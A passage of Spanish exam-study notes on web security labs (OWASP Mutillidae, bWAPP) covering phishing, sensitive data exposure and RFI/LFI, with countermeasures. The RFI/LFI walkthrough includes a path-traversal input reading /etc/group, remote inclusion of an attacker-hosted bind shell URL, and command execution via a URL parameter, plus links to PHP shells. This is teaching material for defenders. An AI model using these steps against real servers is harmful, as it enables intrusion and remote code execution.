- Si introducimos un Email y Password estos saldrán reflejados en la terminal, que estará a la escucha de que las víctimas piquen el anzuelo

#### *Contramedidas contra el Phising*

- Como desarrolladores es complicado defenderse ante el phising
- Obtener un certificado SSL puede ayudar a los usuarios observadores a evitarlo
- Educar a los usuarios sería buena medida, pero en la mayoría de casos es poco realista

### Exposición de datos sensibles
#### *Ejemplo práctico para Examen*

- Muchas veces suele existir un fichero de `phpinfo` en el server.
    - `ip_maquina_owasp/mutillidae/phpinfo`
- Otras veces, encontramos como fallo típico, acceder a `robots.txt` donde podemos encontrar urls que no deberiamos conocer
    - `ip_maquina_owasp/mutillidae/robots.txt` 

#### *Contramedidas contra la exposición de datos sensibles*

- El conocimiento de los datos sensibles de la aplicación es clave
- El uso de cifrados robustos tanto en transimisión como en almacenamiento
- Eliminar todo lo que no sea necesario
- Los logs deben tener una fecha de caducidad y estar bien protegidos

### RFI y LFI

La **INCLUSIÓN Y OBTENCIÓN DE FICHEROS EN EL SERVIDOR** puede darse mediante 2 tipos:

- RFI (Remote File Inclusion) > Ataque de Inclusión de Ficheros Remotos del Servidor. Usando por ejemplo la instruccion INCLUDE de PHP y el REQUEST.
- LFI (Local File Inclusion) > Ataque de Inclusión de Ficheros Locales del Servidor. Leer un fichero de dentro del Servidor hacia afuera. Podría acceder a directorios externos a "/var/www" dentro del servidor y poder leerlos remotamente.

Esta vulnerabilidad es la CONSECUENCIA de otras vulnerabilidades, como ocurre con la INYECCIÓN DE COMANDOS. Por ejemplo, las típicas web que me permiten incluir FOTOS o IMAGENES de perfil, por ahí podríamos colar los ficheros.

La instrucción include de PHP junto a REQUEST permite incluir código adicional a la página, y eso es muy peligroso, porque podriamos incluir código malicioso en una página legítima.

#### RFI (Payload)

Existen muchas Shell en PHP y en otros lenguajes que nos permiten obtener el control sobre el servidor sin necesidad de escribir nuestra propia Shell.

Hay 2 tipos de shell:

- Blind shell: El atacante inicia la sesión a la máquina víctima - [p0wny-shell](https://github.com/flozz/p0wny-shell)
- Reverse shell: La máquina víctima inicia la conexión con el atacante - [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)


#### LFI (Payload)

La clave para realizar éste ataque es conocer la estructura dentro del servidor de la web. Por ejemplo, si es Apache, por defecto podemos esperar que esté en "/var/www/html"

#### *Ejemplo práctico para Examen*

- En OWASP > bWAPP
- Nos logueamos cn usuario y password (bee:bug)
- Listado desplegable > `Remote and Local File Inclusion (RFI/LFI)`
- Veremos un pequeño form, seleccionaremos idioma > Go
- Observaremos que la barra de direcciones y veremos que en la petición GET uno de los parametros es el nombre de otro archivo PHP
    - [url - get] /bWAPP/rlfi.php?language=lang_en.php&action=go
- Con esta información, podemos **suponer** que se está haciando un **include** para incluir este código incluirá ese archivo .php dentro del .php original
- Con esto, podemos hacer referencia a otros archivos de otros directorios y ver si el php los incluye y muestra en la página
- Partiendo de que está corriendo un Apache, la ruta de la que partimos será `/var/www/html`
- Intentaremos salirnos con `../` para acceder a otros directorios
    - Probaremos a introducir en la url `../../../../etc/group` para ver si muestra el fichero de de group
- Tendremos que poner los ficheros que encontramos en `ficheros_var_www_html` en la ruta del apache de la máquina atacante Kali en `/var/www/html`
- El fichero simplebindshell.php debemos pasarlo a txt > `simplebindshell.txt` para que no se autoejecute
- En la página vulnerable introduciremos nuestro fichero agregando en la url `http://{ip_maquina_kali}/simplebindshell.txt`
- Al final de la url agregamos el parametro `&i=ls` o el comando que queramos que se ejecute remotamente, para este caso será un ls
    - De esta forma podríamos incluso llegar a hacer un `netcat`

#### *Contramedidas contra RFI y LFI*

- Una forma de controlar los ataques RFI es controlar el contenido que los usuarios suben a nuestra web
    - Controlar el tipo del fichero
    - Controlar el contenido del fichero si es posible
    - Si no es necesario no permitir subir ficheros
    - Que los ficheros que se suban sean solo de lectura
- Para evitar los ataques LFI, si usamos PHP, podemos modificar las siguientes opciones del fichero PHP.ini
    - allow_url_include = off; Está opción se usa para evitar que se usen funciones como include en PHP, por eso también es útil para evitar RFI
    - allow_url_fopen = off; Evita que puedan acceder a objetos URL del servidor como ficheros
    - También se debe modificar el servidor web para evitar que puedan salir fuera del directorio raíz